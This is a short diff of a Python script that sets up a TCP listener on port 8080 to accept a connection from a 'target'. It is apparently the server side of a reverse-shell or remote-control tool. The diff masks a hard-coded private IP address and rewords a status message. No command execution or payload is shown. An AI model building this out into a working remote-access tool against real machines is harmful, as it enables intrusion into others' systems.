@@ -3,10 +3,10 @@ import socket
 def connect():
 
     s = socket.socket()
-    s.bind(("192.168.0.152", 8080))
+    s.bind(("192.168.x.x", 8080))
     s.listen(1) # define the backlog size for the Queue, I made it 1 as we are expecting a single connection from a single
     conn, addr = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source port in a tuple format (IP,port)
-    print ('[+] We got a connection from', addr)
+    print ('[+] Received connection from', addr)
 
     while True:
 
